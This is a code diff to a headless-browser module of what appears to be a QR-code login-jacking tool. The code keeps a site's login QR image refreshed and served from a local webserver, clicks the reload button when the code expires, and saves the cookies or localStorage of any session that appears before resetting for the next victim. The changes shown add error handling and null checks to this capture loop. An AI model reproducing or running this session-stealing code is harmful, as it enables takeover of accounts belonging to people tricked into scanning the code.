@@ -55,11 +55,17 @@ class headless_browsers:
         else:
             profile = generate_profile(useragent)
         try:
+            #TODO
+            new_headless[module_name]["Controller"] = None
             if Settings.debug:
                 new_headless[module_name]["Controller"] = Firefox(profile)#options=self.opts) # Inserting the browser object
             else:
                 new_headless[module_name]["Controller"] = Firefox(profile, options=self.opts) # Inserting the browser object
-        except:
+        except Exception as e:
+            if Settings.debug:
+                print(" Exception: "+str(e))
+                print(" Trackback: ")
+                traceback.print_exc()
             return {"Status":"Failed"}
         else:
             new_headless[module_name]["Status"] = "Success"
@@ -75,28 +81,31 @@ class headless_browsers:
         try:
             status(f"Waiting for sessions on {module_name}")
             controller = self.browsers[module_name]["Controller"]
-            while self.browsers[module_name]["Status"] == "Success":
-                null = controller.find_elements_by_xpath(change_identifier)
-                if not null:
-                    # If we got here then that means we got session
-                    print()
-                    status(f"Got session on {module_name} module")
-                    if session_type.lower() == "localstorage":
-                        self.save_localstorage(module_name)
-                    else:
-                        self.save_cookie(module_name)
+            if controller:
+                while self.browsers[module_name]["Status"] == "Success":
+                    null = controller.find_elements_by_xpath(change_identifier)
+                    if not null:
+                        # If we got here then that means we got session
+                        print()
+                        status(f"Got session on {module_name} module")
+                        if session_type.lower() == "localstorage":
+                            self.save_localstorage(module_name)
+                        else:
+                            self.save_cookie(module_name)
 
-                    if Settings.verbose:
-                        status("Reseting browser cookies and localStorage to start over..")
-                    #self.restart_session(self.browsers[module_name])
-                    controller.delete_all_cookies()
-                    controller.execute_script("window.localStorage.clear()")
-                    controller.refresh()
-                    if Settings.verbose:
-                        status("Session reset successfully")
-                    time.sleep(5)
-                else:
-                    time.sleep(5)
+                        if Settings.verbose:
+                            status("Reseting browser cookies and localStorage to start over..")
+                        #self.restart_session(self.browsers[module_name])
+                        controller.delete_all_cookies()
+                        controller.execute_script("window.localStorage.clear()")
+                        controller.refresh()
+                        if Settings.verbose:
+                            status("Session reset successfully")
+                        time.sleep(5)
+                    else:
+                        time.sleep(5)
+            else:
+                error(f"Browser controller hasn't been created [{module_name}]")
         except:
             return
 
@@ -105,28 +114,34 @@ class headless_browsers:
         # Always download the QR image from the site to use it in the webserver
         status(f"Running a thread to keep the QR image  [{module_name}]")
         controller = self.browsers[module_name]["Controller"]
-        while self.browsers[module_name]["Status"] == "Success":
-            try:
-                misc.Screenshot(controller, img_xpath, module_name)
-                if Settings.verbose: status(f"QR code image updated! [{module_name}]")
-                time.sleep(3)
-            except:
-                time.sleep(1)
+        if controller:
+            while self.browsers[module_name]["Status"] == "Success":
+                try:
+                    misc.Screenshot(controller, img_xpath, module_name)
+                    #if Settings.verbose: status(f"QR code image updated! [{module_name}]")
+                    time.sleep(3)
+                except:
+                    time.sleep(1)
+        else:
+            error(f"Browser controller hasn't been created [{module_name}]")
 
     @Run_inside_thread("Idle detector thread")
     def check_img(self, module_name, button_xpath):
         # Checks if QR image got blocked by a reloading button and click it
         status(f"Running a thread to detect Idle once it happens then click the QR reload button [{module_name}]")
         controller = self.browsers[module_name]["Controller"]
-        while self.browsers[module_name]["Status"] == "Success":
-            try:
-                btn = controller.find_element_by_xpath(button_xpath) # now it should work
-                # If we got here then that means we got the button
-                if Settings.verbose: status(f"Idle detected, Reloading QR code image [{module_name}]")
-                btn.click()
-                time.sleep(5)
-            except:
-                time.sleep(1) # Yeah we need to be fast
+        if controller:
+            while self.browsers[module_name]["Status"] == "Success":
+                try:
+                    btn = controller.find_element_by_xpath(button_xpath) # now it should work
+                    # If we got here then that means we got the button
+                    if Settings.verbose: status(f"Idle detected, Reloading QR code image [{module_name}]")
+                    btn.click()
+                    time.sleep(5)
+                except:
+                    time.sleep(1) # Yeah we need to be fast
+        else:
+            error(f"Browser controller hasn't been created [{module_name}]")
 
     @Run_inside_thread("Webserver manager thread")
     def serve_module(self, module_name, host, port):
